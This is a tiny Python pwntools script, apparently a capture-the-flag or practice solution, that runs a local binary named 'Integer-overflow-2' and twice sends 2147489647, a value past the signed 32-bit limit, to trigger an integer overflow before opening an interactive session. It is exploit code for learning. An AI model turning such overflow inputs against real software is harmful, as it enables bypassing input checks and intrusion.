from pwn import *

p = process('./Integer-overflow-2')

payload = b"2147489647" 
p.sendline(payload)
payload = b"2147489647" 
p.sendline(payload)

p.interactive()


